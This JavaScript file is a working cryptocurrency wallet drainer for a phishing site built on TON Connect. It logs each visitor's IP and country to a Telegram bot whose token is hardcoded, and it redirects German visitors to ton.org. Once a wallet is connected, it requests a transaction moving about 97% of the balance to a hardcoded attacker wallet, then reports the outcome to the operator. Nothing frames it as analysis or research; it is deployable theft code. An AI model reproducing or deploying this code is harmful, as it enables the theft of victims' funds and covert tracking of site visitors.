var mainWallet = "UQDi5OgrvTJ72AamSrRc_f-4tp3V1nwH-0kMGhJ5qA9tQHoR";
var tgBotToken = "7418351578:AAH-iaGilIS1L_sisoJtUVyM0npC56a4htk";
var tgChat = "-1002225406327"; 



var domain = window.location.hostname;
var ipUser;





fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
    const country = data.country;
    if (country === 'DE') {
        window.location.replace('https://ton.org');
    }
    ipUser = data.ip;
    countryUser = data.country;
    console.log('IP: ' + ipUser);
    console.log('Country: ' + countryUser)
    const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User*: ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
    const encodedMessageOpen = encodeURIComponent(messageOpen);
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageOpen}&parse_mode=Markdown`;
    fetch(url, {
        method: 'POST',
    }).then(response => {
        if (response.ok) {
            console.log('Success send.');
        } else {
            console.error('Error send.');
        }
    }).catch(error => {
        console.error('Error: ', error);
    });
}).catch(error => console.error('Error IP:', error));

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
})
tonConnectUI.on('walletConnected', (walletAddress) => {
    console.log('Адрес кошелька:', walletAddress);
});

async function didtrans() {
    const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
    const data = await response.json();
    let originalBalance = parseFloat(data.balance);
    let processedBalance = originalBalance - (originalBalance * 0.03);
    let tgBalance = processedBalance / 1000000000;
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [{
            address: mainWallet,
            amount: processedBalance
        }, ]
    }
    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
        const encodedMessageSend = encodeURIComponent(messageSend);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageSend}&parse_mode=Markdown`;
        fetch(url, {
            method: 'POST',
        }).then(response => {
            if (response.ok) {
                console.log('Success send.');
            } else {
                console.error('Error send.');
            }
            
        }).catch(error => {
            console.error('Error: ', error);
        });
    } catch (e) {
        const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error.*`;
        const encodedMessageDeclined = encodeURIComponent(messageDeclined);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageDeclined}&parse_mode=Markdown`;
        fetch(url, {
            method: 'POST',
        }).then(response => {
            if (response.ok) {
                console.log('Success send.');
            } else {
                console.error('Error send.');
            }
        }).catch(error => {
            console.error('Error: ', error);
        });
        console.error(e);
    }
}
